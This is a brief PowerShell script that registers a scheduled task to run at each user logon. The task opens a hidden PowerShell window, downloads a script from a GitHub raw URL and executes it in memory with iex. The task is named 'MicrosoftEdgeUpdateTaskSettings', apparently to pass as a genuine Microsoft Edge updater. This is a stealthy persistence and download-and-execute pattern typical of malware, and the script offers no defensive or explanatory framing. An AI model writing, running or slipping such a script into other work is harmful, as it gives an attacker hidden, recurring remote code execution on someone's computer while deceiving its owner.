$action = New-ScheduledTaskAction -Execute "powershell" -Argument "-WindowStyle hidden -command `"iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/daniel0011234/myscripts/main/updater_tester_living_3.ps1'))`""
$trigger = New-ScheduledTaskTrigger -AtLogon
$settings = New-ScheduledTaskSettingsSet
$task = New-ScheduledTask -Action $action -Trigger $trigger -Settings $settings
Register-ScheduledTask MicrosoftEdgeUpdateTaskSettings -InputObject $task
